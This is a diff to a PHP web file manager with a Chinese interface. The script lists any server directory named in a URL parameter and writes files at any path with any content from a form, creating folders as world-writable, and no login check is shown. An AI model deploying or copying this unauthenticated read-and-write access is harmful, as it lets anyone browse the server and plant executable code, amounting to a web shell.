@@ -1,15 +1,12 @@
 /abssss/
 <?php
-$current = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(dirname(__FILE__));
-
-if (!$current || !is_dir($current)) {
-    $current = realpath(dirname(__FILE__));
-}
-
+$current = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if (!$current || !is_dir($current)) $current = getcwd();
 $parent = dirname($current);
-$items = scandir($current);
 
-$createFileMsg = '';
+$items = scandir($current);  // 获取当前目录下所有文件和文件夹
+
+$createFileMsg = ''; 
 
 if (isset($_POST['create_file'])) {
     $newFilePath = trim($_POST['new_file_path']);
@@ -19,6 +16,8 @@ if (isset($_POST['create_file'])) {
         if (!is_dir($newDir)) mkdir($newDir, 0777, true);
         if (file_put_contents($newFilePath, $newFileContent) !== false) {
             $createFileMsg = "<div style='padding:10px; background:#d4edda; color:#155724; border-radius:5px; margin-bottom:20px;'>✅ 创建文件成功：<code>$newFilePath</code></div>";
+            // 重新读取目录内容，显示新文件
+            $items = scandir($current);
         } else {
             $createFileMsg = "<div style='padding:10px; background:#f8d7da; color:#721c24; border-radius:5px; margin-bottom:20px;'>❌ 写入失败：<code>$newFilePath</code></div>";
         }
@@ -49,7 +48,7 @@ if (isset($_POST['copy_files'])) {
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>文件管理</title>
+    <title>文件管理器</title>
     <style>
         body { font-family: Arial; padding: 30px; background: #f3f3f3; }
         .container { background: white; padding: 20px; border-radius: 10px; width: 800px; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
@@ -59,43 +58,41 @@ if (isset($_POST['copy_files'])) {
         code { background: #f8f8f8; padding: 2px 4px; border-radius: 3px; }
         ul { list-style: none; padding-left: 0; }
         li { padding: 5px 0; }
-        a { text-decoration: none; color: #007bff; }
-        a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
 
+<div style="padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ccc; margin-bottom: 20px;">
+    <strong>📂 当前目录：</strong>
+    <?php
+    $parts = explode(DIRECTORY_SEPARATOR, trim($current, DIRECTORY_SEPARATOR));
+    $pathAcc = DIRECTORY_SEPARATOR === '\\' ? '' : '/';
+
+    if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $parts[0])) {
+        $pathAcc = array_shift($parts);
+        echo '<a href="?dir=' . urlencode($pathAcc . DIRECTORY_SEPARATOR) . '">' . htmlspecialchars($pathAcc) . '</a>';
+        if (!empty($parts)) echo ' / ';
+        $pathAcc .= DIRECTORY_SEPARATOR;
+    }
+
+    foreach ($parts as $i => $part) {
+        $pathAcc .= $part . DIRECTORY_SEPARATOR;
+        $link = realpath($pathAcc);
+        if ($link) {
+            echo '<a href="?dir=' . urlencode($link) . '">' . htmlspecialchars($part) . '</a>';
+            if ($i < count($parts) - 1) echo ' / ';
+        }
+    }
+    ?>
+    <?php if ($current !== '/') : ?>
+        <div style="margin-top: 5px;">
+            🔙 <a href="?dir=<?= urlencode($parent) ?>">返回上级目录</a>
+        </div>
+    <?php endif; ?>
+</div>
+
 <div class="container">
-    <h2>📂 当前目录路径：</h2>
-    <div style="padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ccc; margin-bottom: 20px;">
-        <strong>📂 当前目录：</strong>
-        <?php
-        $parts = explode(DIRECTORY_SEPARATOR, trim($current, DIRECTORY_SEPARATOR));
-        $pathAcc = DIRECTORY_SEPARATOR === '\\' ? '' : '/';
-
-        if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $parts[0])) {
-            $pathAcc = array_shift($parts);
-            echo '<a href="?dir=' . urlencode($pathAcc . DIRECTORY_SEPARATOR) . '">' . htmlspecialchars($pathAcc) . '</a>';
-            if (!empty($parts)) echo ' / ';
-            $pathAcc .= DIRECTORY_SEPARATOR;
-        }
-
-        foreach ($parts as $i => $part) {
-            $pathAcc .= $part . DIRECTORY_SEPARATOR;
-            $link = realpath($pathAcc);
-            if ($link) {
-                echo '<a href="?dir=' . urlencode($link) . '">' . htmlspecialchars($part) . '</a>';
-                if ($i < count($parts) - 1) echo ' / ';
-            }
-        }
-        ?>
-        <?php if ($current !== '/') : ?>
-            <div style="margin-top: 5px;">
-                🔙 <a href="?dir=<?= urlencode($parent) ?>">返回上级目录</a>
-            </div>
-        <?php endif; ?>
-    </div>
-
+    <h2>当前目录文件列表</h2>
     <ul>
         <?php foreach ($items as $item):
             if ($item === '.' || $item === '..') continue;
@@ -103,7 +100,7 @@ if (isset($_POST['copy_files'])) {
         ?>
         <li>
             <?php if (is_dir($fullPath)): ?>
-                📁 <a href="?dir=<?= urlencode($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
+                📁 <a href="?dir=<?= htmlspecialchars($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
             <?php else: ?>
                 📄 <?= htmlspecialchars($item) ?>
             <?php endif; ?>
